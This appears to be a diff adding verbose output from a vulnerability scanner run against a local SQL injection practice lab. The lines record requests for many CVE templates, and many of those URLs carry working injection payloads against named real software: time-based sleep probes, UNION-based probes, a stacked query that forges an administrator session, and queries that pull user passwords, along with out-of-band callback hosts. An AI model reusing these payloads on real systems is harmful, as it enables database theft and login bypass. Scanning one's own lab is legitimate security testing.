+[VER] [CVE-2022-26585] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cms/content/list?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-24223] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2022-27984] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2022-27985] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2022-23898] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cms/content/list?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-24260] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-1950] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-1883] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/search/attribute?id=1&id=1&Submit=Submit&Submit=Submit&versionid=*&tf_version=%27+and+(select%20pg_sleep(7))+ISNULL--
+[VER] [CVE-2021-3110] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/module/productcomments/CommentGrade?id=1&id=1&Submit=Submit&Submit=Submit&id_products[]=1*if(now()=sysdate()%2Csleep(8)%2C0)
+[VER] [CVE-2022-21661] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2019-6799] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/pma/index.php?id=1&id=1&Submit=Submit&Submit=Submit&pma_servername=d8cl4tkgeiimvrd6btv0bcnezdjqcgk4g.oast.site&pma_username=3EOKvVTiBFfHn26bbQ07jum5gnQ&pma_password=3EOKvVTiBFfHn26bbQ07jum5gnQ&server=1
+[VER] [CVE-2019-6799] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/phpMyAdmin/index.php?id=1&id=1&Submit=Submit&Submit=Submit&pma_servername=d8cl4tkgeiimvrd6btv0xrohbeank1bzw.oast.site&pma_username=3EOKvVTiBFfHn26bbQ07jum5gnQ&pma_password=3EOKvVTiBFfHn26bbQ07jum5gnQ&server=1
+[VER] [CVE-2022-0867] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-28032] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax/pages.php?id=1&id=1&id=(sleep(6))&Submit=Submit&Submit=Submit
+[WRN] [CVE-2022-3142] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2022-29006] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2022-24265] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2022-22897] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/appagebuilder/config.xml?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-25148] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-29007] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/dfsms/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2022-32007] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2022-28079] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/asign-single-student-subjects.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-2467] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-31978] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/classes/Master.php?id=1&id=1&Submit=Submit&Submit=Submit&f=delete_inquiry
+[VER] [CVE-2022-31977] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/classes/Master.php?id=1&id=1&Submit=Submit&Submit=Submit&f=delete_team
+[VER] [CVE-2022-24627] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[VER] [CVE-2022-0949] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-27927] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/mims/updatecustomer.php?id=1&id=1&Submit=Submit&Submit=Submit&customer_number=-1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(md5(999999999),1,2),NULL,NULL,NULL,NULL,NULL,NULL'
+[WRN] [CVE-2022-28080] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2022-25322] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-29006] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/dashboard.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0948] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/woc-order-alert/assets/admin/js/scripts.js?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-1692] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit&s=codepeople-image-store&post_type=page&feed=rss2
+[VER] [CVE-2022-34590] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/hms/admin/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-32026] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=login
+[VER] [CVE-2019-6799] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/phpmyadmin/index.php?id=1&id=1&Submit=Submit&Submit=Submit&pma_servername=d8cl4tkgeiimvrd6btv0y6bw5m4pmzo3b.oast.site&pma_username=3EOKvVTiBFfHn26bbQ07jum5gnQ&pma_password=3EOKvVTiBFfHn26bbQ07jum5gnQ&server=1
+[WRN] [CVE-2022-3768] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2019-6799] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/_phpmyadmin/index.php?id=1&id=1&Submit=Submit&Submit=Submit&pma_servername=d8cl4tkgeiimvrd6btv0fe36xyhqo6qk5.oast.site&pma_username=3EOKvVTiBFfHn26bbQ07jum5gnQ&pma_password=3EOKvVTiBFfHn26bbQ07jum5gnQ&server=1
+[VER] [CVE-2022-29383] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/scgi-bin/platform.cgi?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-31101] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/blockwishlist/config.xml?id=1&Submit=Submit
+[VER] [CVE-2022-29009] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ccms/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-1768] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/rsvpmaker/v1/stripesuccess/anythinghere?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-25149] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2022-25148] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[VER] [CVE-2022-22897] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/appagebuilder/apajax.php?id=1&id=1&Submit=Submit&Submit=Submit&rand=1076113065999
+[VER] [CVE-2022-31976] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/classes/Master.php?id=1&id=1&Submit=Submit&Submit=Submit&f=delete_request
+[VER] [CVE-2022-29007] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/dfsms/add-category.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2019-6799] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/pmd/index.php?id=1&id=1&Submit=Submit&Submit=Submit&pma_servername=d8cl4tkgeiimvrd6btv0skjeh8wb618g5.oast.site&pma_username=3EOKvVTiBFfHn26bbQ07jum5gnQ&pma_password=3EOKvVTiBFfHn26bbQ07jum5gnQ&server=1
+[VER] [CVE-2022-32024] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=login
+[VER] [CVE-2022-32022] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=login
+[VER] [CVE-2022-32025] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=login
+[VER] [CVE-2022-3254] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=awpcp-get-regions-options&context=search&parent_type=country&parent=test&type=id`+FROM+wp_users+WHERE+1=0+UNION+SELECT+VERSION();--+-
+[VER] [CVE-2022-0949] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/stopbadbots/assets/js/stopbadbots.js?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-32094] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/hms/doctor/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-32028] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=login
+[VER] [CVE-2022-28033] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-3481] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/woo-aliexpress/v1/product-sku?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-32026] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/manage_booking.php?id=1&id=1&id=-1%20union%20select%201,2,3,4,5,6,md5(999999999),8,9,10,11--+&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-40032] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/task/loginValidation.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2019-6799] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&pma_servername=d8cl4tkgeiimvrd6btv0wtfzeguumzdzj.oast.site&pma_username=3EOKvVTiBFfHn26bbQ07jum5gnQ&pma_password=3EOKvVTiBFfHn26bbQ07jum5gnQ&server=1
+[VER] [CVE-2022-29316] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&q=result&searchfor=advancesearch
+[VER] [CVE-2022-3800] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v2/open/rowsInfo?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-4050] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=joomsport_md_load
+[WRN] [CVE-2023-0261] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2022-4049] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php/user/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-33965] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&wmcAction=wmcTrack&url=test&uid=0&pid=0&visitorId=1331'+and+sleep(7)+or+'
+[WRN] [CVE-2022-44290] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2022-44291] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2022-45805] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2022-25149] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[VER] [CVE-2022-32025] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/view_car.php?id=1&id=1&id=-1%20union%20select%201,md5(999999999),3,4,5,6,7,8,9,10--+&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-0037] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-4117] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=iws_gff_fetch_states
+[WRN] [CVE-2023-1408] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2022-4059] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=mcwp_table&mcwp_id=1&order[0][column]=0&columns[0][name]=name+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))aaaa)--+-
+[VER] [CVE-2022-22897] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/appagebuilder/apajax.php?id=1&id=1&Submit=Submit&Submit=Submit&rand=6922664065388
+[VER] [CVE-2023-0562] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/banker/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-40624] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/pfblockerng/www/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-4447] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=get_tag_fonts
+[VER] [CVE-2022-38637] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/hms/user-login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-1020] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-0600] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wp-statistics/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2023-0900] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2023-24000] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/wp/v2/gamipress-logs?id=1&id=1&Submit=Submit&Submit=Submit&trigger_type[]=test')%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(6)))x)%20AND%20('a'='a
+[VER] [CVE-2023-1454] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/jeecg-boot/jmreport/qurestSql?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-32024] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/booking.php?id=1&id=1&Submit=Submit&Submit=Submit&car_id=-1%20union%20select%201,md5(999999999),3,4,5,6,7,8,9,10--+
+[VER] [CVE-2022-45808] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/lp/v1/courses/archive-course?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-22897] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/appagebuilder/apajax.php?id=1&id=1&Submit=Submit&Submit=Submit&rand=2725965185547
+[VER] [CVE-2023-23489] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=edd_download_search&s=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-
+[VER] [CVE-2022-4059] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/cryptocurrency-widgets-pack/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-25157] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/geoserver/ows?id=1&id=1&Submit=Submit&Submit=Submit&service=WFS&version=1.0.0&request=GetCapabilities
+[VER] [CVE-2023-28662] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/gift-voucher/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-4375] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-44588] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=mcwp_table&mcwp_id=1&draw=1&start=0&length=10&columns[0][name]=EXP(~(SELECT*FROM(SELECT+SLEEP(8))x))&order[0][column]=0&order[0][dir]=ASC
+[VER] [CVE-2022-29383] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/scgi-bin/platform.cgi?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2022-46443] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2023-25157] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: name
+[VER] [CVE-2023-27637] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/module/tshirtecommerce/designer?id=1&id=1&Submit=Submit&Submit=Submit&product_id=900982561&parent_id=1;SELECT%20SLEEP(8);
+[WRN] [CVE-2023-33439] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2023-1730] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-32022] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/index.php?id=1&id=1&Submit=Submit&Submit=Submit&page=home
+[VER] [CVE-2022-32028] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/manage_user.php?id=1&id=1&id=-1%20union%20select%201,md5(999999999),3,4,5--+&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-29009] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ccms/dashboard.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-46071] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/classes/Login.php?id=1&id=1&Submit=Submit&Submit=Submit&f=login
+[WRN] [CVE-2023-34751] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2023-0630] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2023-34752] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2023-34753] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2022-4049] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[WRN] [CVE-2023-34756] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2023-23488] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(7)))a)--%20-
+[WRN] [CVE-2023-34754] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2023-34755] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2023-27032] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-34659] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/jeecg-boot/jmreport/show?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-33338] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-46071] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-3197] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/api/flutter_multi_vendor/product-categories?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-32590] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/textmagic/v1/smsreceived?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-3077] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/mstore-api/readme.txt?id=1&Submit=Submit
+[VER] [CVE-2023-30625] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/v1/warehouse/pending-events?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-34133] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ws/msw/tenant/'+union+select+(select+ID+from+SGMSDB.DOMAINS),+'',+'',+'',+'',+'',+(select+MD5(999999999)),'',+'',+'?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-30150] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/leocustomajax/leocustomajax.js?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-22897] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/appagebuilder/apajax.php?id=1&id=1&Submit=Submit&Submit=Submit&rand=747844805917
+[VER] [CVE-2023-23489] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/easy-digital-downloads/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2023-37270] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2023-39121] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2023-27034] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-28787] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-35708] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/machine.aspx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-27847] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-23488] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/paid-memberships-pro/js/updates.js?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-27638] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-38992] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/jeecg-boot/sys/dict/loadTreeData?id=1&Submit=Submit&tableName=sys_user&text=password%20text,id&code=password&hasChildField&converIsLeafVal=1&condition&pid=admin&pidField=username
+[VER] [CVE-2023-38992] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/sys/dict/loadTreeData?id=1&Submit=Submit&tableName=sys_user&text=password%20text,id&code=password&hasChildField&converIsLeafVal=1&condition&pid=admin&pidField=username
+[VER] [CVE-2023-33338] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/dashboard.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-38992] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/jeecg-boot/sys/dict/loadTreeData?id=1&Submit=Submit&tableName=sys_user+t&text=password,id&code=password&hasChildField&converIsLeafVal=1&condition&pid=admin&pidField=username
+[VER] [CVE-2023-39361] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/graph_view.php?id=1&id=1&Submit=Submit&Submit=Submit&action=tree_content&node=1-1-tree_anchor&rfilter=%22or+%22%22%3D%22%28%28%22%29%29%3BSELECT+SLEEP%2810%29%3B--+-
+[VER] [CVE-2023-38992] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/sys/dict/loadTreeData?id=1&Submit=Submit&tableName=sys_user+t&text=password,id&code=password&hasChildField&converIsLeafVal=1&condition&pid=admin&pidField=username
+[VER] [CVE-2023-30192] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-30194] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-34362] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-36284] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-39560] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&m=default&c=user&a=register&u=0
+[VER] [CVE-2023-39650] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-36934] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/human.aspx?id=1&id=1&Submit=Submit&Submit=Submit&Username=SQL%27%3BINSERT+INTO+activesessions+(SessionID)+values+(%273EOKvagc8ncuHqQW2VB4eomlCvg%27);UPDATE+activesessions+SET+Username=(select+Username+from+users+order+by+permission+desc+limit+1)+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27;UPDATE+activesessions+SET+LoginName=%27test@test.com%27+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27;UPDATE+activesessions+SET+RealName=%27test@test.com%27+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27;UPDATE+activesessions+SET+InstId=%271234%27+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27;UPDATE+activesessions+SET+IpAddress=%27123.16.143.55%27+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27;UPDATE+activesessions+SET+LastTouch=%272099-06-10+09:30:00%27+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27;UPDATE+activesessions+SET+DMZInterface=%2710%27+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27;UPDATE+activesessions+SET+Timeout=%2760%27+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27;UPDATE+activesessions+SET+ResilNode=%2710%27+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27;UPDATE+activesessions+SET+AcctReady=%271%27+WHERE+SessionID=%273EOKvagc8ncuHqQW2VB4eomlCvg%27%23
+[WRN] [CVE-2023-36934] Could not execute request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: cause="No parameter 'ep' found." chain="could not evaluate helper expressions"
+[WRN] [CVE-2023-45826] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2023-50578] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cms/content/list.do?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-39796] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/miniform/ajax_delete_message.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-22897] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/appagebuilder/apajax.php?id=1&id=1&Submit=Submit&Submit=Submit&rand=8984429074427
+[VER] [CVE-2023-6360] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/my-calendar/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-5204] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-6030] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/logdash-activity-log/README.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-6063] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wp-fastest-cache/readme.txt?id=1&Submit=Submit
